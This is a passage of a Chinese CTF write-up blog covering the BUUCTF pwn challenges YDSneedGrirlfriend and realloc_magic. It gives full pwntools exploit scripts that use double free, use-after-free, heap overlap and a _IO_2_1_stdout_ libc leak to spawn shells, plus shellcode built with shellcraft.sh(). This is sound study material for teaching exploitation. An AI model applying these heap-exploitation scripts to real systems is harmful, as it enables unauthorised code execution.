class="string">&#x27;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;syscall&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27; plz:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xC</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h3><h4 id="0x00-基本信息-6"><a href="#0x00-基本信息-6" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/45.png" class=""><h4 id="0x01-IDA分析-6"><a href="#0x01-IDA分析-6" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/46.png" class=""><p>上面还有一个限制堆块数量的判断，不重要，可以看到这里申请了一个0x10的堆块写入了print_girlfriend_name的函数地址，但是这个print_girfriend_name…就是一个后门</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/47.png" class=""><p>现在还没感觉像后门，但是看到print函数的时候，仔细看看(*girlfriendlst[v1])(girlfrendlist[v1])，如果我们劫持了包含print_girlfriend_name的0x10堆块，修改成其他的函数地址，比如system@got，那么就会变成system(girlfrendlist[v1] + 8)</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/48.png" class=""><p>再看看del函数，思路就很清晰了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/49.jpg" class=""><p>有个后门函数…</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/50.png" class=""><h4 id="0x02-解题思路-3"><a href="#0x02-解题思路-3" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><ol><li>double free一个堆块</li><li>申请一个0x20的堆块，double free的0x10的堆块就写入了print_girlfriend_name</li><li>申请的时候改成后门函数</li></ol><h4 id="0x03-完整EXP-5"><a href="#0x03-完整EXP-5" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"><span class="comment"># add(0x20,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>看了大佬的wp，其实不用改，只要print_girlfriend_name上面写着是后门函数就行，不知道为啥system(“/bin/sh”)一直不行，一进入就down了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><h4 id="0x00-基本信息-7"><a href="#0x00-基本信息-7" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/52.png" class="" width="52"><p>保护全开，肯定是泄露<code>libc</code>打<code>hook</code></p><h4 id="0x01-IDA分析-7"><a href="#0x01-IDA分析-7" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><p><code>realloc</code>函数，需要注意的是<code>realloc_ptr = realloc(realloc_ptr, size)</code>，根据<code>realloc</code>的特性，如果不<code>realloc(0)</code>，它将一直对同一个堆块<code>realloc</code>，具体请看《从广东省强网杯–<code>girlfriend</code>看<code>realloc</code>的艺术》</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  size = get_int();</span><br><span class="line">  realloc_ptr = <span class="built_in">realloc</span>(realloc_ptr, size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, realloc_ptr, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>存在<code>uaf</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(realloc_ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ba</code>这个函数呢，就是把<code>realloc_ptr</code>清零，并且只能用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ba</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( lock )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  lock = <span class="number">1</span>;</span><br><span class="line">  realloc_ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-解题思路-4"><a href="#0x02-解题思路-4" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>首先此程序不存在<code>show</code>函数，所以肯定是要打<code>IO_2_1_stdout</code>来泄露<code>libc</code>的，既然要打<code>IO_2_1_stdout</code>，那又得整出个<code>unsorted bin</code>指向<code>main_arena + 88</code>，并且要产生堆叠来修改<code>main_arena + 88</code>后两个字节，同时需要爆破1位，概率为1/16，泄露<code>libc</code>的具体细节在<a href="https://zyen12138.github.io/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/">_IO_FILE攻击</a>里面，那么又因为这是<code>libc-2.27</code>的题目，所以要获得<code>unsorted bin</code>肯定得先填满<code>tache</code>，所以完整思路如下：</p><ol><li><code>free</code>同一个块7次填满<code>tache</code>，再<code>free</code>一次进入<code>unsorted bin</code>：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">[free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] </span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>由于本地的<code>libc</code>打了补丁不能<code>double free</code>，所以加载远程的<code>libc</code>，远程的<code>libc</code>又没有调试符号….只能<code>vmmap</code>查看堆的起始位置，看到<code>0x000055ff8d55b2e0</code>这个堆块的<code>fd</code>和<code>bk</code>变成了<code>main_arena+88</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0x55ff8d55b000</span><br><span class="line">0x55ff8d55b000:0x00000000000000000x0000000000000251</span><br><span class="line">0x55ff8d55b010:0x00010000000000000x0700000000000100</span><br><span class="line">0x55ff8d55b020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b030:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b050:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b080:0x000055ff8d55b2600x0000000000000000</span><br><span class="line">0x55ff8d55b090:0x00000000000000000x000055ff8d55b3f0</span><br><span class="line">0x55ff8d55b0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b0c0:0x00000000000000000x000055ff8d55b2e0</span><br><span class="line">0x55ff8d55b0d0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">0x55ff8d55b240:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b250:0x00000000000000000x0000000000000081</span><br><span class="line">0x55ff8d55b260:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b270:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b280:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b290:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2d0:0x00000000000000000x0000000000000111</span><br><span class="line">0x55ff8d55b2e0:0x00007f5ca1575ca00x00007f5ca1575ca0</span><br><span class="line">0x55ff8d55b2f0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>接着申请0x70的大小，由于它比之前的<code>realloc_ptr</code>的堆块要大（之前为0），所以它会从<code>tache</code>找，发现之前有个0x70的堆块，就直接分配出去了，紧接着又分配了0x180的堆块，由于它还是比之前的<code>realloc_ptr</code>的堆块要大（之前为0x70），所以它将扩大之前的0x70，也就是把0x100这个堆块给包含进来了，这个0x100的堆块再之前可是包着<code>main_arena+88</code>的指针的，也就是说，我们可以写<code>main_arena+88</code>的指针了！（修改chunk大小的原理还不是很清楚….，后面爆破再也没爆破出来，所以没调试出来，哭了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x180</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x41</span>)+p8(<span class="number">0x60</span>)+p8(<span class="number">0x87</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55e2f303a250:0x00000000000000000x0000000000000191</span><br><span class="line">0x55e2f303a260:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a270:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a280:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a290:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2d0:0x63636363636363630x0000000000000041</span><br><span class="line">0x55e2f303a2e0:0x00007fcdef0a87600x00007fcdefce2ca0</span><br><span class="line">0x55e2f303a2f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>此时申请0x0的大小会把之前0x180的大小给<code>free</code>掉，在<code>bin</code>中就会出现<code>0x55e2f303a2e0 -&gt; 0x00007fcdef0a8760</code>的链表然后，再申请两次0x100，就能修改<code>IO_2_1_stdout</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0,&#x27;&#x27;)</span><br><span class="line">add(0x100,&#x27;a&#x27;)</span><br><span class="line">add(0,&#x27;&#x27;)</span><br><span class="line">add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))</span><br></pre></td></tr></table></figure><p>顺利泄露出<code>libc</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(io.recvuntil(&quot;\x7f&quot;,timeout=0.1[-6:].ljust(8,&#x27;\x00&#x27;))-0x3e82a0</span><br></pre></td></tr></table></figure><p>清空<code>realloc_ptr</code>就可以再来一次，这次就是把<code>main_arena+88</code>改成<code>free_hook</code>，然后往<code>free_hook</code>里面写<code>system</code>，至于为什么不用<code>one_gadget</code>，因为没有<code>malloc_hook</code>来调整栈帧，所以用<code>system</code>来<code>getshell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(&#x27;666&#x27;)</span><br></pre></td></tr></table></figure><h4 id="0x03-完整EXP-6"><a href="#0x03-完整EXP-6" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot;, 25009)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./roarctf_2019_realloc_magic&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_realloc_magic&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content?&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    [free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment">#fill tcache</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#to unsortbin fd-&gt;arena</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x180</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x61</span>)+p8(<span class="number">0x60</span>)+p8(<span class="number">0x87</span>))<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>))<span class="comment">#get _IO_2_1_stdout_  change flag and write_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get_libc</span></span><br><span class="line">    libc_base = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3e82a0</span></span><br><span class="line">    <span class="keyword">if</span> libc_base == -<span class="number">0x3e82a0</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[* ]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span 